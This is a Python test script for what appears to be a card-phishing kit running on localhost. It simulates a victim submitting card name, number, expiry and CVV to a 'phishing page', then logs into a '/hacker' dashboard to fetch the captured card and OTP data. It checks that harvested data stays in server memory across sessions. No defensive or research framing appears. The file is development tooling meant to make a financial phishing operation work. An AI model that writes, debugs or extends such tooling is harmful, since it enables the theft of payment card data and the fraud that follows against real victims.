#!/usr/bin/env python3
"""
Test script to simulate cross-browser data capture issue
"""
import requests
from bs4 import BeautifulSoup
import json

BASE_URL = "http://localhost:9999"

def extract_csrf_token(html_content):
    """Extract CSRF token from HTML"""
    soup = BeautifulSoup(html_content, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf_token'})
    if csrf_input:
        return csrf_input.get('value')
    return None

def test_victim_submission():
    """Simulate victim submitting card data (separate session/browser)"""
    print("=" * 60)
    print("TEST 1: Victim submits card data (simulating different browser)")
    print("=" * 60)

    # Create a new session (simulates a new browser)
    victim_session = requests.Session()

    # Get the phishing form
    print("\n1. Victim visits phishing page...")
    response = victim_session.get(f"{BASE_URL}/")
    print(f"   Status: {response.status_code}")

    # Extract CSRF token
    csrf_token = extract_csrf_token(response.text)
    print(f"   CSRF Token: {csrf_token[:30]}..." if csrf_token else "   No CSRF token found")

    # Submit card data
    print("\n2. Victim submits card data...")
    data = {
        'csrf_token': csrf_token,
        'cardName': 'Test User',
        'cardNumber': '4580123412341232',
        'expiry': '12/35',
        'cvv': '123'
    }
    response = victim_session.post(f"{BASE_URL}/submit", data=data)
    print(f"   Status: {response.status_code}")
    print(f"   Response contains 'loading': {'loading' in response.text.lower()}")

    return response.status_code == 200

def test_admin_data_retrieval():
    """Simulate admin checking hacker dashboard (separate session/browser)"""
    print("\n" + "=" * 60)
    print("TEST 2: Admin checks hacker dashboard (simulating different browser)")
    print("=" * 60)

    # Create a NEW session (simulates a completely different browser)
    admin_session = requests.Session()

    # Get login page
    print("\n1. Admin visits login page...")
    response = admin_session.get(f"{BASE_URL}/login")
    print(f"   Status: {response.status_code}")

    # Extract CSRF token
    csrf_token = extract_csrf_token(response.text)
    print(f"   CSRF Token: {csrf_token[:30]}..." if csrf_token else "   No CSRF token found")

    # Login
    print("\n2. Admin logs in...")
    login_data = {
        'csrf_token': csrf_token,
        'username': 'admin',
        'password': 'password'
    }
    response = admin_session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False)
    print(f"   Status: {response.status_code}")
    print(f"   Redirect to: {response.headers.get('Location', 'No redirect')}")

    if response.status_code != 302:
        print(f"   ERROR: Login failed! Response: {response.text[:200]}")
        return False

    # Follow redirect to hacker dashboard
    print("\n3. Admin accesses hacker dashboard...")
    response = admin_session.get(f"{BASE_URL}/hacker")
    print(f"   Status: {response.status_code}")

    # Get captured data via API
    print("\n4. Admin fetches captured data via API...")
    response = admin_session.get(f"{BASE_URL}/hacker/data")
    print(f"   Status: {response.status_code}")

    if response.status_code == 200:
        try:
            data = response.json()
            print(f"\n   Captured Data:")
            print(f"   - Card data: {data.get('card') is not None}")
            if data.get('card'):
                print(f"     - Cardholder: {data['card'].get('cardholder_name')}")
                print(f"     - Card #: {data['card'].get('card_number')}")
            print(f"   - OTP data: {data.get('otp') is not None}")
            return data.get('card') is not None
        except Exception as e:
            print(f"   ERROR parsing JSON: {e}")
            print(f"   Raw response: {response.text[:200]}")
            return False
    else:
        print(f"   ERROR: Failed to fetch data!")
        return False

if __name__ == "__main__":
    print("\n" + "=" * 60)
    print("CROSS-BROWSER DATA CAPTURE TEST")
    print("=" * 60)
    print("\nThis test simulates the issue where:")
    print("- Victim uses one browser to submit card data")
    print("- Admin uses a DIFFERENT browser to view hacker dashboard")
    print("- Data should still appear (it's in global server memory)")
    print()

    # Test 1: Victim submission
    victim_success = test_victim_submission()

    # Test 2: Admin retrieval (different session)
    admin_success = test_admin_data_retrieval()

    # Results
    print("\n" + "=" * 60)
    print("TEST RESULTS")
    print("=" * 60)
    print(f"Victim submission: {'✓ SUCCESS' if victim_success else '✗ FAILED'}")
    print(f"Admin data retrieval: {'✓ SUCCESS' if admin_success else '✗ FAILED'}")
    print()

    if victim_success and admin_success:
        print("✓ PASS: Cross-browser data capture works correctly!")
        print("  Data is properly stored in global server memory.")
    elif victim_success and not admin_success:
        print("✗ FAIL: Data was captured but admin cannot retrieve it!")
        print("  This suggests an authentication or state isolation issue.")
    elif not victim_success:
        print("✗ FAIL: Victim submission failed!")
        print("  Check CSRF validation or form processing.")

    print("=" * 60)
